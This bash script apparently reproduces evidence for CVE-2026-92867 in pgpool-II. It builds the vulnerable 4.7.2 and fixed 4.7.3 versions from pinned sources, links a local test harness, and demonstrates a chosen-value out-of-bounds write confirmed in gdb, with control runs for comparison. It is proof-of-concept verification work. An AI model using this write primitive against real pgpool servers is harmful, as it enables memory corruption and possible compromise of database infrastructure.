#!/bin/bash
# Reproduce the CVE-2026-92867 direct-call evidence from pinned sources.
# Prerequisites: the two tarballs in ../src/ (verify with ../src/SHA256SUMS),
# gcc, gdb, libpq headers. All work is local and loopback-only; no network probe.
set -u
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
WORK="${TMPDIR:-/tmp}/w108-pgpool-replay"
mkdir -p "$WORK"

fetch_and_build() {
    local ver="$1" tag="$2"
    local src="$WORK/pgpool-II-$ver"
    if [ ! -d "$src" ]; then
        tar -xzf "$ROOT/src/pgpool-II-$ver.tar.gz" -C "$WORK" || exit 1
        (cd "$src" && ./configure --prefix="$WORK/inst-$ver" >/dev/null &&
         make -j4 CFLAGS="-g -O0 -fno-omit-frame-pointer" LDFLAGS="" >/dev/null) || exit 1
    fi
    echo "$src"
}

VULN="$(fetch_and_build 4.7.2 vuln)"
FIXED="$(fetch_and_build 4.7.3 fixed)"

link_harness() {
    local src="$1" out="$2"
    local inc="-I$src/src/include -I$src/src/include/parser -I/usr/include/postgresql -I$src"
    local objs="$src/src/watchdog/wd_json_data.o $src/src/utils/json.o \
$src/src/utils/json_writer.o $src/src/parser/list.o \
$src/src/parser/stringinfo.o $src/src/tools/fe_memutils.o \
$src/src/tools/fe_port.o"
    # shellcheck disable=SC2086
    gcc -g -O0 -fno-omit-frame-pointer $inc -o "$out" "$(dirname "$0")/harness.c" $objs \
        -lm -lcrypt -lresolv || exit 1
}

link_harness "$VULN" "$WORK/harness-vuln"
link_harness "$FIXED" "$WORK/harness-fixed"

echo "=== A: pinned 4.7.2, NodeCount=1 (safe control) ==="
"$WORK/harness-vuln" 1 0x11111111 0x22222222 2>&1
echo "=== B: pinned 4.7.2, NodeCount=2 (wild write) ==="
"$WORK/harness-vuln" 2 0x41414141 0x42424242 2>&1
echo "=== C: pinned 4.7.3, NodeCount=2 (fixed control) ==="
"$WORK/harness-fixed" 2 0x41414141 0x42424242 2>&1
echo "=== D: gdb chosen-value readback on pinned 4.7.2 ==="
gdb -q -batch -x "$(dirname "$0")/gdb-write.cmd" "$WORK/harness-vuln" 2>&1
